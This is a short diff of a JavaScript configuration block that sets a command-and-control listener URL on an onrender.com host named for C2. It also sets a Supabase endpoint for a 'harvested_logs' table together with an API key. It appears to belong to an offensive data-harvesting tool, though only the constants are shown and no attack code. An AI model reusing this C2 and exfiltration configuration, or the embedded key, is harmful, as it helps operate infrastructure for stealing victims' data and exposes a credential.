@@ -2,7 +2,7 @@
 // ==================================================================
 // --- CONFIGURATION - PASTE YOUR URLS AND KEYS HERE ---
 // ==================================================================
-const C2_LISTENER_URL = "https://your-unique-name.onrender.com"; // Your Render URL
+const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; // Your Render URL
 
 const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
 const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
